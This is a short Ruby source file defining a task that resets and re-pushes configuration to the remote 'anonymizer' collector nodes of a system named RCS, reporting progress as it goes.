require_relative '../tasks'

module RCS
module DB

class TopologyTask
  include RCS::DB::NoFileTaskType
  include RCS::Tracer

  def total
    ::Collector.where({type: 'remote'}).count + 2
  end
  
  def next_entry
    yield @description = "Pushing topology"

    # mark all the anonymizers as "not configured"
    ::Collector.where({type: 'remote'}).each do |anon|
      anon.configured = false
      anon.save
    end

    ::Collector.where({type: 'remote'}).each do |anon|

      yield @description = "Configuring '#{anon.name}'"

      # don't push to "not monitored" anon
      next unless anon.poll

      #don't push elements outside topology
      next if anon.next == [ nil ] and anon.prev == [ nil ]

      raise "Cannot push to #{anon.name}" unless Frontend.nc_push(anon.address)
    end
    
    yield @description = "Topology applied successfully"
  end
end

end # DB
end # RCS